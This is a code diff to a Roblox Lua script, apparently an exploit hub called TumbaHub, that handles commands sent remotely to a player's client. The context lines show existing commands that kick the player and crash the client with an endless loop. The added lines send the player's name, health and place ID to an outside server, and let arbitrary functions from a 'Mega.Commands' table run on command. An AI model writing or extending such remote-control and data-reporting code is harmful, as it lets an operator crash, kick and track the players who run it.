@@ -72,6 +72,32 @@ task.spawn(function()
                         local customReason = string.sub(cmd, 7)
                         LocalPlayer:Kick(customReason)
                         
+                    -- НОВОЕ: Проверка статуса
+                    elseif cmd == "/check_status" then
+                        local health = "N/A"
+                        local maxHealth = "N/A"
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                            health = tostring(math.floor(LocalPlayer.Character.Humanoid.Health))
+                            maxHealth = tostring(math.floor(LocalPlayer.Character.Humanoid.MaxHealth))
+                        end
+                        
+                        local placeId = tostring(game.PlaceId)
+                        
+                        local statusText = string.format(
+                            "📊 Статус игрока %s:\n- Здоровье: %s / %s\n- ID Локации: %s",
+                            LocalPlayer.Name,
+                            health,
+                            maxHealth,
+                            placeId
+                        )
+                        
+                        pcall(requestFunc, {
+                            Url = "https://tumbahub-server.onrender.com/api/send_message",
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = HttpService:JSONEncode({ text = statusText })
+                        })
+                        
                     -- 3. Краш клиента
                     elseif cmd == "/crash" then
                         while true do end 
@@ -102,6 +128,10 @@ task.spawn(function()
                         else
                             warn("TumbaHub: Не удалось загрузить скрипт reset_player: " .. tostring(err))
                         end
+
+                    -- Интеграция с модульным хабом
+                    elseif Mega and Mega.Commands and Mega.Commands[cmd] then 
+                        task.spawn(Mega.Commands[cmd], data)
                     end
 
                     -- =========================
